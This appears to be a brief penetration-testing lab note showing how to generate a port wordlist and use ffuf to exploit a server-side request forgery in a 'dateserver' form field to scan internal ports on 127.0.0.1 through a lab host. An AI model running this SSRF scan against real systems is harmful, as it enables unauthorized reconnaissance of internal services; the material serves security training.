
Create A Word List of Ports
```shell-session
seq 1 10000 > ports.txt
```

Command using SSRF to port scan a service
```shell-session
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```
